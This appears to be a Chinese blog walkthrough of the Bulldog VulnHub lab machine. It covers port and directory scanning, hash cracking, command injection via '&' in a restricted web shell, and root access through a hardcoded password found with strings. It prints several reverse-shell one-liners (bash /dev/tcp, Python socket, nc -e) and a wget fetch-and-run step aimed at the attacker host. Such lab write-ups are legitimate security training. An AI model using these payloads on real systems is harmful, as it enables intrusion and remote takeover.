---
title: "Bulldog-Vulnhub Walkthrough"
categories: [ "安全技术" ]
tags: [ "vulnhub","靶机","walkthrough" ]
draft: false
slug: "442"
date: "2020-01-17 21:25:00"
---

[靶机地址][1]

### 工具及漏洞信息

- netdiscover
- nmap
- dirb
- dirsearch
- gobuster
- linux 反弹 shell
- wget 文件下载
- linux 下 string 命令
- sudo -l 查看用户可执行命令

** 部分工具的用法和详细说明请参考此系列的第一篇文章：[bossplayersCTF:1-Vulnhub Walkthrough][2] **

## 0x00 信息收集

### 扫描靶机信息

`netdiscover`的`-r`参数扫描`192.168.1.0/16`结果如下：

![][3]

`nmap`扫描主机及端口信息：

```
nmap -sS -A -n -T4 -p- 192.168.1.158
```

![][4]

> WSGI：全称是 Web Server Gateway Interface，WSGI 不是服务器、python 模块、框架、API 或者任何软件，只是一种规范，描述 webserver 如何与 web application 通信的规范。

### 扫描路径

`dirb`扫描路径：

```
dirb http://192.168.1.158
```

![][5]

使用`dirsearch`扫描出来的结果好像没有`dirb`的全，当然也可能是字典原因

```
python3 dirsearch.py -t 50 -e .php,.txt,.zip,.html -x 400,403,404,500,503,514,564 -u http://192.168.1.8
```

![][6]

`gobuster`扫描也不给力：

```
gobuster dir -u http://192.168.1.8 -s 200,301,302 -t 50 -q -w /usr/share/seclists/Discovery/Web-Content/big.txt
```

![][7]

### 访问路径

`/admin`目录是个`django`的管理员登陆界面，常规的弱口令不管用

![][8]

`/dev`界面上有一些开发人员的邮箱，用的都是公司的邮箱

![][9]

查看网页源码可以看到一些用户的密码哈希值：

![][10]

拿去常用的解密网站[cmd5][11]和[somd5][12]解密

也可以使用国外批量破解`hash`网站[hashkiller][13]

但这网站需要开启全局，你懂的

![][14]

解密出两对账号密码：`nick/bulldog`和`sara/bulldoglover`

那个超明显的`web-shell`按钮跳转到了`dev/shell`

但是界面提示需要认证：

![][15]

这里先不能做文章

## 0x01 获取 shell

目录基本访问完了，尝试用我们解密得到的账号密码登录`/admin`管理员界面

使用两对账号密码登陆后的界面都提示没有权限编辑任何东西

![][16]

看起来毫无头绪，但当你重新访问原来提示你需要认证的`/dev/shell`界面时

它已悄然发生了变化

![][17]

根据页面提示，我们只能执行它列出来的几个命令

但是我们可以使用&将多个命令进行拼接，那么就可以绕过限制

接下来我们现在`kali`上监听，然后尝试几种常用的`shell`反弹方式

```
nc -lvp 4444
```

1.使用`bash`反弹

```
pwd&bash -i >& /dev/tcp/192.168.1.6/4444 0>&1
```

> bash -i 表示产生一个 bash 的交互环境
> 0>&1 将标准输入域标准输出内容相结合，然后重定向给前面的标准输出内容

实测没有反弹成功

2.使用`python`反弹

尝试使用一句话`python`弹`shell`：

```
pwd&python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.6",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

提示如下：

![][18]

> INVALID COMMAND. I CAUGHT YOU HACKER! ';' CAN BE USED TO EXECUTE MULTIPLE COMMANDS!!

`;`被过滤了，不能直接在交互的地方执行命令，那我们就把它放在脚本里

```
python -c "import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("192.168.1.6",4444));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/bash","-i"]);"
```

存为`python-shell.py`，移入`apache2`默认目录`/var/www/html`

开启`apache2`服务:`service apache2 start`

![][19]

在`web-shell`界面执行：

```
pwd&wget http://192.168.1.6/python-shell.py
pwd&python python-shell.py
```

我实测也没有成功，但是大佬有成功的

3.使用`nc`反弹(需要靶机上有 nc)

```
nc -e /bin/bash 192.168.1.6 4444
```

4.通过`echo`反弹(成功)

```
echo 'bash -i >& /dev/tcp/192.168.1.6/4444 0>&1' | bash
```

![][20]

## 0x02 提权 root

> 发现 home 目录下有一个 bulldogadmin，那么优先查看这个目录。结果执行 ls
> 命令时没有发现任何东西，然后我执行了 ls -a，发现了隐藏的文件夹。

![][21]

我们进入这个`.hiddenadmindirectory`文件夹，发现一个注释文件：

![][22]

用`file`命令查看下这个用户文件是啥：

![][23]

发现是个`ELF`文件，`ELF`文件简单来说就是 Linux 的主要可执行文件格式。

执行`strings customPermissionApp`，有很多的字符串，其中有一段引起了我的注意：

```
GLIBC_2.2.5
UH-H
SUPERultH
imatePASH
SWORDyouH
CANTget
dH34%(
AWAVA
AUATL
[]A\A]A^A_
Please enter a valid username to use root privileges
        Usage: ./customPermissionApp <username>
sudo su root
;*3$"
GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609
crtstuff.c
```

在我们的程序中，有一个用“strings”命令找到的硬编码密码。

假设 H 是行尾或某个末端的片段，那我们就得到了一个密码`SUPERultimatePASSWORDyouCANTget`

大胆猜测，这就是`note`里面说的`django`用户的密码

根据我们上面扫描获得的信息，`ssh`端口在 23，于是我们直接`ssh`连接：

```
ssh -p 23 django@192.168.1.8
```

![][24]

连接后`sudo su`切换`root`用户，只需要`django`用户的密码即可，成功`get root shell`

![][25]

本文完。

参考文章：

- [VULNHUB BULLDOG WALKTHROUGH][26]
- [VulnHub 靶机系列实战教程][27]

[1]: https://img.soapffz.com/archives_img/2020/01/17/archives_20200117_212057.png
[2]: https://soapffz.com/427.html
[3]: https://img.soapffz.com/archives_img/2020/01/17/archives_20200117_212057.png
[4]: https://img.soapffz.com/archives_img/2020/01/17/archives_20200117_212957.png
[5]: https://img.soapffz.com/archives_img/2020/01/17/archives_20200117_215229.png
[6]: https://img.soapffz.com/archives_img/2020/01/17/archives_20200122_100320.png
[7]: https://img.soapffz.com/archives_img/2020/01/17/archives_20200122_101020.png
[8]: https://img.soapffz.com/archives_img/2020/01/17/archives_20200122_101602.png
[9]: https://img.soapffz.com/archives_img/2020/01/17/archives_20200122_101659.png
[10]: https://img.soapffz.com/archives_img/2020/01/17/archives_20200122_101842.png
[11]: https://www.cmd5.com/
[12]: https://www.somd5.com/
[13]: https://hashkiller.co.uk/
[14]: https://img.soapffz.com/archives_img/2020/01/17/archives_20200122_103812.png
[15]: https://img.soapffz.com/archives_img/2020/01/17/archives_20200122_103022.png
[16]: https://img.soapffz.com/archives_img/2020/01/17/archives_20200122_104020.png
[17]: https://img.soapffz.com/archives_img/2020/01/17/archives_20200122_104206.png
[18]: https://img.soapffz.com/archives_img/2020/01/17/archives_20200122_105200.png
[19]: https://img.soapffz.com/archives_img/2020/01/17/archives_20200122_110707.png
[20]: https://img.soapffz.com/archives_img/2020/01/17/archives_20200122_111349.png
[21]: https://img.soapffz.com/archives_img/2020/01/17/archives_20200122_112502.png
[22]: https://img.soapffz.com/archives_img/2020/01/17/archives_20200122_113108.png
[23]: https://img.soapffz.com/archives_img/2020/01/17/archives_20200122_113331.png
[24]: https://img.soapffz.com/archives_img/2020/01/17/archives_20200122_115041.png
[25]: https://img.soapffz.com/archives_img/2020/01/17/archives_20200122_115421.png
[26]: https://pavornoc.wordpress.com/2017/12/14/vulnhub-bulldog-walkthrough/
[27]: https://mp.weixin.qq.com/s/skCNWPiEPgJcHXSmsif5qQ